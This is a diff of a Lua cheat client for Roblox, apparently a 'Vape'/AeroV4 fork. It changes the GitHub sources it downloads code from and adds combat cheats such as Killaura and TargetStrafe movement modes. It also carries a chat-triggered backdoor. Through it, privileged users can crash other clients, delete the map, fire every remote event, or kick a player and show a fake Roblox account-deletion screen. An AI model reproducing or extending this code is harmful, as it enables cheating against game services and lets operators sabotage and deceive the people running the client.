@@ -2,10 +2,6 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
---This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
---This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
---This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
---This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 local loadstring = function(...)
 	local res, err = loadstring(...)
 	if err and vape then
@@ -22,7 +18,7 @@ end
 local function downloadFile(path, func)
 	if not isfile(path) then
 		local suc, res = pcall(function()
-			return game:HttpGet('https://raw.githubusercontent.com/wrealaero/AeroV4/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
+			return game:HttpGet('https://raw.githubusercontent.com/6GrandDadPGN/AeroV4/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
 		end)
 		if not suc or res == '404: Not Found' then
 			error(res)
@@ -41,12 +37,6 @@ local queue_on_teleport = queue_on_teleport or function() end
 local cloneref = cloneref or function(obj)
 	return obj
 end
-local function connectEvent(object, eventName, func)
-	object[eventName]:Connect(func)
-end
-local function namecallEvent(object, eventName, ...)
-	task.spawn(object[eventName], object, ...)
-end
 
 local playersService = cloneref(game:GetService('Players'))
 local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
@@ -62,23 +52,7 @@ local groupService = cloneref(game:GetService('GroupService'))
 local textChatService = cloneref(game:GetService('TextChatService'))
 local contextService = cloneref(game:GetService('ContextActionService'))
 local coreGui = cloneref(game:GetService('CoreGui'))
-local function getPlayerFromDisplayName(displayName)
-	for _, plr in pairs(playersService:GetPlayers()) do
-		if plr.DisplayName == displayName then
-			print(plr)
-			return plr
-		end
-	end
-	return nil
-end
-local function getPlayerFromShortName(short_name)
-	for _, plr in pairs(playersService:GetPlayers()) do
-		if plr.Name:lower():sub(1, #short_name) == short_name:lower() or plr.DisplayName:lower():sub(1, #short_name) == short_name:lower() then
-			return plr
-		end
-	end
-	return nil
-end
+
 local isnetworkowner = identifyexecutor and table.find({'AWP', 'Nihon'}, ({identifyexecutor()})[1]) and isnetworkowner or function()
 	return true
 end
@@ -460,21 +434,20 @@ run(function()
 					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
 					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
 					if newchannel then
-						newchannel:SendAsync('; I USING AeroV4 VXPE')
+						newchannel:SendAsync('helloimusinginhaler')
 					end
 					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
-					textChatService.ChannelTabsConfiguration.Enabled = false
 				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' ; I USING AeroV4 VXPE', 'All')
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
 				end
 			end
 		end
 	end
 
 	function whitelist:process(msg, plr)
-		if plr == lplr and msg == '; I USING AeroV4 VXPE' then return true end
+		if plr == lplr and msg == 'helloimusinginhaler' then return true end
 
-		if self.localprio > 0 and not self.said[plr.Name] and msg == '; I USING AeroV4 VXPE' and plr ~= lplr then
+		if self.localprio > 0 and not self.said[plr.Name] and msg == 'helloimusinginhaler' and plr ~= lplr then
 			self.said[plr.Name] = true
 			notif('Vape', plr.Name..' is using vape!', 60)
 			self.customtags[plr.Name] = {{
@@ -488,17 +461,15 @@ run(function()
 			return true
 		end
 
-		if self.localprio < self:get(plr) then
+		if self.localprio < self:get(plr) or plr == lplr then
 			local args = msg:split(' ')
-			local mcmd = table.remove(args, 1)
-			local target = table.remove(args, 1)
-
-			for cmd, func in pairs(whitelist.commands) do
-				if mcmd:lower() == ";"..cmd:lower() then
-					if target == "@v" then
-						func(args)
-					elseif getPlayerFromShortName(target) == lplr then
-						func(args)
+			table.remove(args, 1)
+			if self:getplayer(args[1]) then
+				table.remove(args, 1)
+				for cmd, func in self.commands do
+					if msg:sub(1, cmd:len() + 1):lower() == ';'..cmd:lower() then
+						func(args, plr)
+						return true
 					end
 				end
 			end
@@ -550,15 +521,18 @@ run(function()
 		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 			if exp and exp:WaitForChild('appLayout', 5) then
 				vape:Clean(exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
-					obj = obj:FindFirstChild('BodyText', true)
+					local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
+					obj = obj:FindFirstChild('TextMessage', true)
 					if obj and obj:IsA('TextLabel') then
-						if obj.Text:find('; I USING AeroV4 VXPE') then
-							obj.Parent.Parent.Visible = false
+						if plr then
+							self:newchat(obj, plr, true)
+							obj:GetPropertyChangedSignal('Text'):Wait()
+							self:newchat(obj, plr)
 						end
-					end
 
-					if tonumber(obj.Name:split('-')[1]) == 0 then
-						obj.Visible = false
+						if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
+							obj.Visible = false
+						end
 					end
 				end))
 			end
@@ -584,7 +558,7 @@ run(function()
 			local bubblechat = exp:WaitForChild('bubbleChat', 5)
 			if bubblechat then
 				vape:Clean(bubblechat.DescendantAdded:Connect(function(newbubble)
-					if newbubble:IsA('TextLabel') and newbubble.Text:find('; I USING AeroV4 VXPE') then
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
 						newbubble.Parent.Parent.Visible = false
 					end
 				end))
@@ -595,12 +569,12 @@ run(function()
 	function whitelist:update(first)
 		local suc = pcall(function()
 			local _, subbed = pcall(function()
-				return game:HttpGet('https://github.com/wrealaero/whitelists/tree/main')
+				return game:HttpGet('https://github.com/poopparty/whitelistcheck')
 			end)
 			local commit = subbed:find('currentOid')
 			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
 			commit = commit and #commit == 40 and commit or 'main'
-			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/wrealaero/whitelists/'..commit..'//whitelist.json', true)
+			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/poopparty/whitelistcheck/'..commit..'/PlayerWhitelist.json', true)
 		end)
 		if not suc or not hash or not whitelist.get then return true end
 		whitelist.loaded = true
@@ -641,30 +615,21 @@ run(function()
 			end
 
 			if whitelist.textdata ~= whitelist.olddata then
+				if whitelist.data.Announcement.expiretime > os.time() then
+					local targets = whitelist.data.Announcement.targets
+					targets = targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
+
+					if table.find(targets, tostring(lplr.UserId)) then
+						local hint = Instance.new('Hint')
+						hint.Text = 'VAPE ANNOUNCEMENT: '..whitelist.data.Announcement.text
+						hint.Parent = workspace
+						game:GetService('Debris'):AddItem(hint, 20)
+					end
+				end
 				whitelist.olddata = whitelist.textdata
-
-				local suc, res = pcall(function()
-					return httpService:JSONDecode(whitelist.textdata)
-				end)
-	
-				whitelist.data = suc and type(res) == 'table' and res or whitelist.data
-				whitelist.localprio = whitelist:get(lplr)
-
 				pcall(function()
 					writefile('newvape/profiles/whitelist.json', whitelist.textdata)
 				end)
-			end
-
-			if whitelist.data.Announcement.expiretime > os.time() then
-				local targets = whitelist.data.Announcement.targets
-				targets = targets == 'all' and {tostring(lplr.UserId)} or targets:split(',')
-
-				if table.find(targets, tostring(lplr.UserId)) then
-					local hint = Instance.new('Hint')
-					hint.Text = 'VAPE ANNOUNCEMENT: '..whitelist.data.Announcement.text
-					hint.Parent = workspace
-					game:GetService('Debris'):AddItem(hint, 20)
-				end
 			end
 
 			if whitelist.data.KillVape then
@@ -681,15 +646,73 @@ run(function()
 
 	whitelist.commands = {
 		byfron = function()
-			while wait() do
-				pcall(function()
-					for i,v in game:GetDescendants() do
-						if v:IsA("RemoteEvent") and not string.find(v.Name:lower(),"lobby") and not string.find(v.Name:lower(),"teleport") then
-							v:FireServer()
-						end
-					end
+			task.spawn(function()
+				if vape.ThreadFix then
+					setthreadidentity(8)
+				end
+				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
+				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
+				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
+				local fonttokens = getrenv().require(game:GetService("CorePackages").Packages._Index.UIBlox.UIBlox.App.Style.Tokens).getTokens('Desktop', 'Dark', true)
+				local buildersans = getrenv().require(game:GetService('CorePackages').Packages._Index.UIBlox.UIBlox.App.Style.Fonts.FontLoader).new(true, fonttokens):loadFont()
+				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
+				local localProvider = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				vape.gui.Enabled = false
+				coreGui:ClearAllChildren()
+				lightingService:ClearAllChildren()
+				for _, v in workspace:GetChildren() do
+					pcall(function()
+						v:Destroy()
+					end)
+				end
+				lplr.kick(lplr)
+				guiService:ClearError()
+				local gui = Instance.new('ScreenGui')
+				gui.IgnoreGuiInset = true
+				gui.Parent = coreGui
+				local frame = Instance.new('ImageLabel')
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.fromScale(1, 1)
+				frame.BackgroundColor3 = Color3.fromRGB(224, 223, 225)
+				frame.ScaleType = Enum.ScaleType.Crop
+				frame.Parent = gui
+				task.delay(0.3, function()
+					frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg'
 				end)
-			end
+				task.delay(0.6, function()
+					local modPrompt = Roact.createElement(auth, {
+						style = {},
+						screenSize = vape.gui.AbsoluteSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = 'Delete',
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {{abuseType = 'ABUSE_TYPE_CHEAT_AND_EXPLOITS', utteranceText = 'ExploitDetected - Place ID : '..game.PlaceId}},
+							messageToUser = 'Roblox does not permit the use of third-party software to modify the client.'
+						},
+						termsActivated = function() end,
+						communityGuidelinesActivated = function() end,
+						supportFormActivated = function() end,
+						reactivateAccountActivated = function() end,
+						logoutCallback = function() end,
+						globalGuiInset = {top = 0}
+					})
+
+					local screengui = Roact.createElement(localProvider, {
+						localization = tLocalization.new('en-us')
+					}, {Roact.createElement(UIBlox.Style.Provider, {
+						style = {
+							Theme = darktheme,
+							Font = buildersans
+						},
+					}, {modPrompt})})
+
+					Roact.mount(screengui, coreGui)
+				end)
+			end)
 		end,
 		crash = function()
 			task.spawn(function()
@@ -698,7 +721,7 @@ run(function()
 					part.Size = Vector3.new(1e10, 1e10, 1e10)
 					part.Parent = workspace
 				until false
- 			end)
+			end)
 		end,
 		deletemap = function()
 			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
@@ -739,9 +762,9 @@ run(function()
 		reveal = function()
 			task.delay(0.1, function()
 				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I AM USING THE AeroV4 VXPE | d i s c o r d . g g / i c i c l e')
+					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
 				else
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I AM USING THE AeroV4 VXPE | d i s c o r d . g g / i c i c l e', 'All')
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
 				end
 			end)
 		end,
@@ -801,52 +824,6 @@ run(function()
 		table.clear(whitelist.commands)
 		table.clear(whitelist.data)
 		table.clear(whitelist)
-	end)
-end)
-run(function()
-	for _, channel in pairs(textChatService:WaitForChild("TextChannels", 9e9):GetChildren()) do
-		vape:Clean(channel.MessageReceived:Connect(function(message)
-			if message.TextSource then
-				local success, plr = pcall(playersService.GetPlayerByUserId, playersService, message.TextSource.UserId)
-				whitelist:process(message.Text, plr)
-			end
-		end))
-	end
-
-	task.spawn(function()
-		local found = false
-		while not found and task.wait(1) do
-			for i,v in pairs(getgc(true)) do
-				if typeof(v) == "table" and rawget(v, "KnitStart") and rawget(v, "getPrefixTags") then
-					local hook
-					hook = hookfunction(v.getPrefixTags, function(_, player)
-						local tag_result = ""
-						if shared.vape then
-							local userLevel, attackable, tags = whitelist:get(player)
-							if tags then
-								for _, tag in pairs(tags) do
-									if typeof(tag.color) == "table" then
-										tag_result ..= `<font color="#{Color3.fromRGB(unpack(tag.color)):ToHex():lower()}">[{tag.text}]</font> `
-									else
-										tag_result ..= `<font color="#{tag.color:ToHex():lower()}">[{tag.text}]</font> `
-									end
-								end
-							end
-						end
-
-						local tags = player:FindFirstChild("Tags")
-						if tags then
-							for _, tag in pairs(tags:GetChildren()) do
-								tag_result ..= tag.Value .. " "
-							end
-						end
-						return tag_result
-					end)
-					found = true
-					break
-				end
-			end
-		end
 	end)
 end)
 entitylib.start()
@@ -2374,8 +2351,6 @@ run(function()
 end)
 	
 run(function()
-	local KillauraVisualThread
-	local KillauraVisualColorPicker
 	local Killaura
 	local Targets
 	local CPS
@@ -2523,72 +2498,7 @@ run(function()
 		Max = 10,
 		Default = 10
 	})
-	Color = Killaura:CreateColorSlider({
-		Name = 'Color',
-		DefaultOpacity = 0.5,
-		Function = function(h, s, v, o)
-			if VisualizerPart then
-				VisualizerPart.Color = Color3.fromHSV(h, s, v)
-				VisualizerPart.Transparency = 1 - o
-			end
-		end
-	})
-	Killaura:CreateToggle({
-		Name = 'Visualizer',
-		Function = function(callback)
-			KillauraVisualColorPicker.Object.Visible = callback
-			local VisualizerPart
-			local function createVisualizer(player)
-				if workspace.CurrentCamera:FindFirstChild("XSI_VISUAL") then
-					workspace.CurrentCamera:FindFirstChild("XSI_VISUAL"):Destroy()
-				end
-				local Visualizer = Instance.new("MeshPart")
-				Visualizer.MeshId = "rbxassetid://3726303797"
-				Visualizer.Name = "XSI_VISUAL"
-				Visualizer.CanCollide = false
-				Visualizer.Anchored = true
-				Visualizer.Material = Enum.Material.Neon
-				Visualizer.Size = Vector3.new(10 * 1, 0.01, 10 * 1)
-				Visualizer.Color = Color3.fromHSV(KillauraVisualColorPicker.Hue, KillauraVisualColorPicker.Sat, KillauraVisualColorPicker.Value)
-				Visualizer.Parent = workspace.CurrentCamera
-	
-				local function updatePosition()
-					if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-						if _G.AntiHitClone then
-							Visualizer.Position = _G.AntiHitClone.HumanoidRootPart.Position - Vector3.new(0, 2.9, 0)
-						else
-							Visualizer.Position = player.Character.HumanoidRootPart.Position - Vector3.new(0, 2.9, 0)
-						end
-					end
-				end
-				game:GetService("RunService").Heartbeat:Connect(updatePosition)
-	
-				local function updateColor()
-					Visualizer.Color = Color3.fromHSV(KillauraVisualColorPicker.Hue, KillauraVisualColorPicker.Sat, KillauraVisualColorPicker.Value)
-				end
-				game:GetService("RunService").Heartbeat:Connect(updateColor)
-	
-				return Visualizer
-			end
-	
-			local player = game.Players.LocalPlayer
-			if callback and not VisualizerPart then
-				VisualizerPart = createVisualizer(player)
-			end
-	
-			local function cleanVisualizer()
-				if VisualizerPart then
-					VisualizerPart:Destroy()
-					VisualizerPart = nil
-				end
-			end
-	
-			if not callback then
-				cleanVisualizer()
-			end
-		end
-	})
-	Mouse = Killaura:CreateToggle({Name = 'Require mouse down AAA'})
+	Mouse = Killaura:CreateToggle({Name = 'Require mouse down'})
 	Lunge = Killaura:CreateToggle({Name = 'Sword lunge only'})
 	Killaura:CreateToggle({
 		Name = 'Show target',
@@ -2877,7 +2787,7 @@ run(function()
 	})
 	MovementMode = MouseTP:CreateDropdown({
 		Name = 'Movement',
-		List = {'Motor', 'CFrame', 'Lerp'},
+		List = {'CFrame', 'Motor', 'Lerp'},
 		Function = function(val)
 			Length.Object.Visible = val == 'Lerp'
 			Delay.Object.Visible = val == 'Lerp'
@@ -3429,10 +3339,164 @@ run(function()
 	local SearchRange
 	local StrafeRange
 	local YFactor
+	local MovementType
+	local JumpMode
+	local JumpHeight
+	local AirStrafing
+	local StrafeSpeed
 	local rayCheck = RaycastParams.new()
 	rayCheck.RespectCanCollide = true
 	local module, old
 	
+	local movementTypes = {
+		"Original",
+		"Aggressive",
+		"Defensive",
+		"ZigZag",
+		"SpinThisBitchHoe",
+		"RandomShit"
+	}
+	
+	local jumpModes = {
+		"None",
+		"Normal",
+		"Spam",
+		"Timed",
+		"RandomSHi",
+		"CantCatchMeBih"
+	}
+	
+	local strafeState = {
+		lastJumpTime = 0,
+		jumpCooldown = 0,
+		movementAngle = 0,
+		zigzagDirection = 1,
+		lastZigzagTime = 0,
+		randomSeed = math.random(1, 1000),
+		orbitDirection = 1,
+		inAir = false,
+		lastGroundTime = 0
+	}
+
+	local function calculateMovement(ent, root, targetPos, flymodEnabled, wallcheck)
+		local movementType = MovementType.Value
+		local jumpMode = JumpMode.Value
+		local localPosition = root.Position
+		local entityPos = Vector3.new(targetPos.X, localPosition.Y, targetPos.Z)
+		local vec = Vector3.zero
+		local shouldJump = false
+		local jumpPower = JumpHeight.Value / 100
+		
+		if movementType == "Original" then
+			local yFactor = math.abs(localPosition.Y - targetPos.Y) * (YFactor.Value / 100)
+			local newPos = entityPos + (CFrame.Angles(0, math.rad(strafeState.movementAngle), 0).LookVector * (StrafeRange.Value - yFactor))
+			vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
+			strafeState.movementAngle = (strafeState.movementAngle + (StrafeSpeed.Value * 0.5)) % 360
+			
+		elseif movementType == "Aggressive" then
+			local closeRange = StrafeRange.Value * 0.7
+			local angleIncrement = StrafeSpeed.Value * 0.8
+			local newPos = entityPos + (CFrame.Angles(0, math.rad(strafeState.movementAngle), 0).LookVector * closeRange)
+			vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
+			strafeState.movementAngle = (strafeState.movementAngle + angleIncrement) % 360
+			
+		elseif movementType == "Defensive" then
+			local wideRange = StrafeRange.Value * 1.3
+			local angleIncrement = StrafeSpeed.Value * 0.3
+			local newPos = entityPos + (CFrame.Angles(0, math.rad(strafeState.movementAngle), 0).LookVector * wideRange)
+			vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
+			strafeState.movementAngle = (strafeState.movementAngle + angleIncrement) % 360
+			
+		elseif movementType == "ZigZag" then
+			if tick() - strafeState.lastZigzagTime > 0.3 then
+				strafeState.zigzagDirection = -strafeState.zigzagDirection
+				strafeState.lastZigzagTime = tick()
+			end
+			
+			local sideOffset = strafeState.zigzagDirection * (StrafeRange.Value * 0.5)
+			local rightVector = CFrame.lookAt(localPosition, entityPos).RightVector
+			local newPos = entityPos + (rightVector * sideOffset)
+			vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
+			
+		elseif movementType == "Orbital" then
+			local orbitSpeed = StrafeSpeed.Value * 0.4
+			strafeState.orbitDirection = (localPosition - entityPos).Magnitude > StrafeRange.Value * 1.2 and 1 or strafeState.orbitDirection
+			strafeState.orbitDirection = (localPosition - entityPos).Magnitude < StrafeRange.Value * 0.8 and -1 or strafeState.orbitDirection
+			
+			local newPos = entityPos + (CFrame.Angles(0, math.rad(strafeState.movementAngle), 0).LookVector * StrafeRange.Value)
+			vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
+			strafeState.movementAngle = (strafeState.movementAngle + (orbitSpeed * strafeState.orbitDirection)) % 360
+			
+		elseif movementType == "Random" then
+			math.randomseed(strafeState.randomSeed + math.floor(tick()))
+			local randomAngle = math.random(0, 360)
+			local randomRange = math.random(StrafeRange.Value * 0.7, StrafeRange.Value * 1.3)
+			local newPos = entityPos + (CFrame.Angles(0, math.rad(randomAngle), 0).LookVector * randomRange)
+			vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
+			
+			if math.random(1, 20) == 1 then
+				strafeState.randomSeed = math.random(1, 1000)
+			end
+		end
+		
+		local currentTime = tick()
+		local distanceToTarget = (localPosition - targetPos).Magnitude
+		
+		if jumpMode == "Normal" then
+			if not strafeState.inAir and currentTime - strafeState.lastJumpTime > 1.5 then
+				shouldJump = math.random(1, 4) == 1
+			end
+			
+		elseif jumpMode == "Spam" then
+			if currentTime - strafeState.lastJumpTime > 0.4 then
+				shouldJump = true
+			end
+			
+		elseif jumpMode == "Timed" then
+			if currentTime - strafeState.lastJumpTime > 1.0 then
+				shouldJump = true
+			end
+			
+		elseif jumpMode == "Combat" then
+			if distanceToTarget < StrafeRange.Value * 1.2 and currentTime - strafeState.lastJumpTime > 0.8 then
+				shouldJump = true
+			end
+			
+		elseif jumpMode == "AntiAim" then
+			if math.random(1, 15) == 1 and currentTime - strafeState.lastJumpTime > 0.5 then
+				shouldJump = true
+			end
+		end
+		
+		if AirStrafing.Enabled and strafeState.inAir then
+			vec = vec * 0.7
+			
+			if jumpMode ~= "None" then
+				vec = vec + Vector3.new(0, 0.1 * jumpPower, 0)
+			end
+		end
+		
+		return vec, shouldJump
+	end
+
+	local function performJump(shouldJump, humanoid)
+		if shouldJump and humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
+			humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			strafeState.lastJumpTime = tick()
+			strafeState.inAir = true
+			strafeState.lastGroundTime = tick()
+		end
+	end
+
+	local function updateAirState(humanoid)
+		if humanoid then
+			strafeState.inAir = humanoid.FloorMaterial == Enum.Material.Air
+			if not strafeState.inAir then
+				strafeState.lastGroundTime = tick()
+			end
+		end
+	end
+
 	TargetStrafe = vape.Categories.Blatant:CreateModule({
 		Name = 'TargetStrafe',
 		Function = function(callback)
@@ -3446,6 +3510,7 @@ run(function()
 				
 				old = module.moveFunction
 				local flymod, ang, oldent = vape.Modules.Fly or {Enabled = false}
+				
 				module.moveFunction = function(self, vec, face)
 					local wallcheck = Targets.Walls.Enabled
 					local ent = not inputService:IsKeyDown(Enum.KeyCode.S) and entitylib.EntityPosition({
@@ -3465,7 +3530,16 @@ run(function()
 							local factor, localPosition = 0, root.Position
 							if ent ~= oldent then
 								ang = math.deg(select(2, CFrame.lookAt(targetPos, localPosition):ToEulerAnglesYXZ()))
+								strafeState.movementAngle = ang
 							end
+							
+							updateAirState(entitylib.character.Humanoid)
+							
+							local newVec, shouldJump = calculateMovement(ent, root, targetPos, flymod.Enabled, wallcheck)
+							vec = newVec
+							
+							performJump(shouldJump, entitylib.character.Humanoid)
+							
 							local yFactor = math.abs(localPosition.Y - targetPos.Y) * (YFactor.Value / 100)
 							local entityPos = Vector3.new(targetPos.X, localPosition.Y, targetPos.Z)
 							local newPos = entityPos + (CFrame.Angles(0, math.rad(ang), 0).LookVector * (StrafeRange.Value - yFactor))
@@ -3490,7 +3564,6 @@ run(function()
 							end
 	
 							ang += factor % 360
-							vec = ((newPos - localPosition) * Vector3.new(1, 0, 1)).Unit
 							vec = vec == vec and vec or Vector3.zero
 							TargetStrafeVector = vec
 						else
@@ -3507,14 +3580,27 @@ run(function()
 					module.moveFunction = old
 				end
 				TargetStrafeVector = nil
+				strafeState = {
+					lastJumpTime = 0,
+					jumpCooldown = 0,
+					movementAngle = 0,
+					zigzagDirection = 1,
+					lastZigzagTime = 0,
+					randomSeed = math.random(1, 1000),
+					orbitDirection = 1,
+					inAir = false,
+					lastGroundTime = 0
+				}
 			end
 		end,
-		Tooltip = 'Automatically strafes around the opponent'
+		Tooltip = 'Automatically strafes around the opponent with multiple movement types'
 	})
+	
 	Targets = TargetStrafe:CreateTargets({
 		Players = true,
 		Walls = true
 	})
+	
 	SearchRange = TargetStrafe:CreateSlider({
 		Name = 'Search Range',
 		Min = 1,
@@ -3524,6 +3610,7 @@ run(function()
 			return val == 1 and 'stud' or 'studs'
 		end
 	})
+	
 	StrafeRange = TargetStrafe:CreateSlider({
 		Name = 'Strafe Range',
 		Min = 1,
@@ -3533,12 +3620,57 @@ run(function()
 			return val == 1 and 'stud' or 'studs'
 		end
 	})
+	
 	YFactor = TargetStrafe:CreateSlider({
 		Name = 'Y Factor',
 		Min = 0,
 		Max = 100,
 		Default = 100,
 		Suffix = '%'
+	})
+	
+	StrafeSpeed = TargetStrafe:CreateSlider({
+		Name = 'Strafe Speed',
+		Min = 1,
+		Max = 10,
+		Default = 5,
+		Function = function(val)
+		end
+	})
+	
+	MovementType = TargetStrafe:CreateDropdown({
+		Name = 'Movement Type',
+		List = movementTypes,
+		Function = function(val)
+			strafeState.movementAngle = 0
+			strafeState.zigzagDirection = 1
+			strafeState.lastZigzagTime = 0
+		end
+	})
+	
+	JumpMode = TargetStrafe:CreateDropdown({
+		Name = 'Jump Mode',
+		List = jumpModes,
+		Function = function(val)
+			strafeState.lastJumpTime = 0
+		end
+	})
+	
+	JumpHeight = TargetStrafe:CreateSlider({
+		Name = 'Jump Power',
+		Min = 50,
+		Max = 150,
+		Default = 100,
+		Suffix = '%',
+		Tooltip = 'Adjusts jump intensity for air strafing'
+	})
+	
+	AirStrafing = TargetStrafe:CreateToggle({
+		Name = 'Air Strafing',
+		Function = function(callback)
+		end,
+		Default = true,
+		Tooltip = 'Adjust movement when in air for better control'
 	})
 end)
 	
@@ -3589,17 +3721,18 @@ run(function()
 		if vape.ThreadFix then
 			setthreadidentity(8)
 		end
-		local EntityArrow = Instance.new('ImageLabel')
-		EntityArrow.Size = UDim2.fromOffset(256, 256)
-		EntityArrow.Position = UDim2.fromScale(0.5, 0.5)
-		EntityArrow.AnchorPoint = Vector2.new(0.5, 0.5)
-		EntityArrow.BackgroundTransparency = 1
-		EntityArrow.BorderSizePixel = 0
-		EntityArrow.Visible = false
-		EntityArrow.Image = getcustomasset('newvape/assets/new/arrowmodule.png')
-		EntityArrow.ImageColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(Color.Hue, Color.Sat, Color.Value)
-		EntityArrow.Parent = Folder
-		Reference[ent] = EntityArrow
+	
+		local arrow = Instance.new('ImageLabel')
+		arrow.Size = UDim2.fromOffset(256, 256)
+		arrow.Position = UDim2.fromScale(0.5, 0.5)
+		arrow.AnchorPoint = Vector2.new(0.5, 0.5)
+		arrow.BackgroundTransparency = 1
+		arrow.BorderSizePixel = 0
+		arrow.Visible = false
+		arrow.Image = getcustomasset('newvape/assets/new/arrowmodule.png')
+		arrow.ImageColor3 = entitylib.getEntityColor(ent) or Color3.fromHSV(Color.Hue, Color.Sat, Color.Value)
+		arrow.Parent = Folder
+		Reference[ent] = arrow
 	end
 	
 	local function Removed(ent)
@@ -3621,21 +3754,21 @@ run(function()
 	end
 	
 	local function Loop()
-		for ent, EntityArrow in Reference do
+		for ent, arrow in Reference do
 			if Distance.Enabled then
 				local distance = entitylib.isAlive and (entitylib.character.RootPart.Position - ent.RootPart.Position).Magnitude or math.huge
 				if distance < DistanceLimit.ValueMin or distance > DistanceLimit.ValueMax then
-					EntityArrow.Visible = false
+					arrow.Visible = false
 					continue
 				end
 			end
 	
 			local _, rootVis = gameCamera:WorldToScreenPoint(ent.RootPart.Position)
-			EntityArrow.Visible = not rootVis
+			arrow.Visible = not rootVis
 			if rootVis then continue end
-			
-			local dir = (gameCamera.CFrame:PointToObjectSpace(ent.RootPart.Position) * Vector3.new(1, 0, 1)).Unit
-			EntityArrow.Rotation = math.deg(math.atan2(dir.Z, dir.X))
+	
+			local dir = CFrame.lookAlong(gameCamera.CFrame.Position, gameCamera.CFrame.LookVector * Vector3.new(1, 0, 1)):PointToObjectSpace(ent.RootPart.Position)
+			arrow.Rotation = math.deg(math.atan2(dir.Z, dir.X))
 		end
 	end
 	
@@ -3730,6 +3863,7 @@ run(function()
 		if vape.ThreadFix then
 			setthreadidentity(8)
 		end
+	
 		if Mode.Value == 'Highlight' then
 			local cham = Instance.new('Highlight')
 			cham.Adornee = ent.Character
@@ -4754,9 +4888,9 @@ run(function()
 			local nametag = Instance.new('TextLabel')
 			nametag.TextSize = 14 * Scale.Value
 			nametag.FontFace = FontOption.Value
-			local ize = getfontsize(removeTags(Strings[ent]), nametag.TextSize, nametag.FontFace, Vector2.new(100000, 100000))
+			local size = getfontsize(removeTags(Strings[ent]), nametag.TextSize, nametag.FontFace, Vector2.new(100000, 100000))
 			nametag.Name = ent.Player and ent.Player.Name or ent.Character.Name
-			nametag.Size = UDim2.fromOffset(ize.X + 8, ize.Y + 7)
+			nametag.Size = UDim2.fromOffset(size.X + 8, size.Y + 7)
 			nametag.AnchorPoint = Vector2.new(0.5, 1)
 			nametag.BackgroundColor3 = Color3.new()
 			nametag.BackgroundTransparency = Background.Value
@@ -4772,9 +4906,6 @@ run(function()
 			if not Targets.Players.Enabled and ent.Player then return end
 			if not Targets.NPCs.Enabled and ent.NPC then return end
 			if Teammates.Enabled and (not ent.Targetable) and (not ent.Friend) then return end
-			if vape.ThreadFix then
-				setthreadidentity(8)
-			end
 	
 			local nametag = {}
 			nametag.BG = Drawing.new('Square')
@@ -4825,10 +4956,10 @@ run(function()
 				Reference[ent] = nil
 				Strings[ent] = nil
 				Sizes[ent] = nil
-				for _, v2 in v do
+				for _, obj in v do
 					pcall(function()
-						v2.Visible = false
-						v2:Remove()
+						obj.Visible = false
+						obj:Remove()
 					end)
 				end
 			end
@@ -4854,8 +4985,8 @@ run(function()
